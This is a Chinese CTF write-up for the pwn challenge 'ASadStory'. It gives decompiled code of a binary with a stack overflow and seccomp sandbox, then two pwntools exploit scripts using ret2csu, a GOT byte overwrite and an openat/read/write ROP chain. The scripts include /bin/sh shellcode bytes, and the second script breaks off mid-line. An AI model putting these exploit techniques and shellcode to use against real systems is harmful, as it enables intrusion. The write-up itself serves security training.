        <content type="html"><![CDATA[<p><img src="/EXP_FILE/97aa869f5bad1ebb9f7a850637e5c183_MD5.jpeg"></p><blockquote><p>WP：<a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">DAS X 0psu3 - 飞书云文档 (feishu.cn)</a></p></blockquote><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ASadStory"><a href="#ASadStory" class="headerlink" title="ASadStory"></a>ASadStory</h2><p>没canary，partial relro<br><img src="/EXP_FILE/7ef99aa3078903a58b74311db309722c_MD5.jpeg">【2.31-0ubuntu9.12】无泄露堆沙盒<br>试运行一下😂<br><img src="/EXP_FILE/0aa0df98f3b91e0b12b185e69f91bd52_MD5.jpeg"></p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>直接看1.yes，我们可以选择两个武器：<br><img src="/EXP_FILE/105a6c6cb8dcfd465ec799ecc734a962_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">sub_1492</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,now I will tell you the name of the betrayers:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"s* &amp;&amp; B*!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your mission is to defeat them!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can choice a weapon: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_1420</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_1468</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>武器1<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_1420</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> sub_1249<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_2200<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>能泄露pie，但是会关闭标准输出</li><li>武器2<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_1468</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sanbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>一个无限栈溢出，不过同时会打开prctl沙箱，禁用了execve和open，并限制了arch<br><img src="/EXP_FILE/c1fd61751f52ca7e5e88cf79bf28ff2c_MD5.jpeg"></li></ul><blockquote><p>想要ret2libc，就必须泄露pie而关掉输出，可关掉输出就无法得到libc地址，左右为难。</p></blockquote><h3 id="EXP1-改close为syscall"><a href="#EXP1-改close为syscall" class="headerlink" title="EXP1-改close为syscall"></a>EXP1-改close为syscall</h3><p>我们在无法泄露libc的情况下如何orw?</p><p>思路1：改close末位字节为syscall，利用read函数控制rax寄存器进行系统调用，同时利用ret2csu控制各寄存器。<br>系统调用write泄露libc，接着orw完成利用（为了方便进行了栈劫持）<br><img src="/EXP_FILE/02b968aaa6a44677f73b44c31244dc7d_MD5.jpeg"></p><p>禁用了open？用openat不就行拉</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>   <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./challenge"</span><span class="token comment">#context.log_level="debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'1.yes / 2.no'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>pie<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1249</span>lg<span class="token punctuation">(</span><span class="token string">'pie'</span><span class="token punctuation">,</span>pie<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'是什么呢?'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">csuattack</span><span class="token punctuation">(</span>r12<span class="token punctuation">,</span>r13<span class="token punctuation">,</span>r14<span class="token punctuation">,</span>r15<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#def csuattack(edi,rsi,rdx,call[got])</span><span class="token keyword">global</span> csugadget1<span class="token operator">=</span><span class="token number">0x000000000000163A</span><span class="token operator">+</span>piegadget2<span class="token operator">=</span><span class="token number">0x0000000000001620</span><span class="token operator">+</span>piecsu<span class="token operator">=</span>p64<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>csu<span class="token operator">+=</span>p64<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span>csu<span class="token operator">+=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token keyword">return</span> csubss<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x4000</span><span class="token operator">+</span><span class="token number">0x200</span>gets_p<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token operator">+</span>pieclose_g<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">)</span><span class="token operator">+</span>pieread_g<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token operator">+</span>pierdi<span class="token operator">=</span><span class="token number">0x0000000000001643</span><span class="token operator">+</span>piersp_ppp<span class="token operator">=</span><span class="token number">0x000000000000163d</span><span class="token operator">+</span>pie<span class="token comment">#-------------edit close_p and stack pivot</span>payload<span class="token operator">=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>csuattack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>close_g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_g<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">,</span>gets_p<span class="token punctuation">,</span>rsp_ppp<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">b'\x15'</span><span class="token punctuation">)</span><span class="token comment">#-----------leak libc</span>bss<span class="token operator">+=</span><span class="token number">0x200</span>payload<span class="token operator">=</span>csuattack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_g<span class="token punctuation">)</span><span class="token comment">#rax=1,write</span>payload<span class="token operator">+=</span>csuattack<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>read_g<span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>close_g<span class="token punctuation">)</span><span class="token comment">#write(2,read_g,0x8)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">,</span>gets_p<span class="token punctuation">,</span>rsp_ppp<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>uu64<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token comment">#------------orw</span>OPENAT<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'openat'</span><span class="token punctuation">)</span>READ<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>WRITE<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresslg<span class="token punctuation">(</span><span class="token string">'rdi'</span><span class="token punctuation">,</span>rdi<span class="token punctuation">)</span>rsi<span class="token operator">=</span><span class="token number">0x000000000002601f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrdx<span class="token operator">=</span><span class="token number">0x0000000000142c92</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspayload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>OPENAT<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>WRITE<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">b'./flag\x00'</span><span class="token comment">#dbg('')</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/3f72d06cdf39249a15265f21eb2b376c_MD5.jpeg"></p><h3 id="EXP2-利用magic-gadget"><a href="#EXP2-利用magic-gadget" class="headerlink" title="EXP2-利用magic_gadget"></a>EXP2-利用magic_gadget</h3><p>预期解是用一个gadget，直接在libc函数上加减，这样也能完成利用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x0000000000001232</span> <span class="token operator">:</span> add dword ptr <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">0x3d</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ebx <span class="token punctuation">;</span> nop dword ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"官方WP"</span></div><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./challenge'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> flag<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./challenge"</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"--->"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1249</span>leak<span class="token punctuation">(</span><span class="token string">"code_base"</span><span class="token punctuation">,</span>code_base<span class="token punctuation">)</span>ret2csu_front <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x1620</span>ret2csu_behind <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x163a</span>magic_gadget <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x1232</span>setbuf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span> <span class="token operator">+</span> code_basepop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000001643</span> <span class="token operator">+</span> code_basepop_rsi <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token 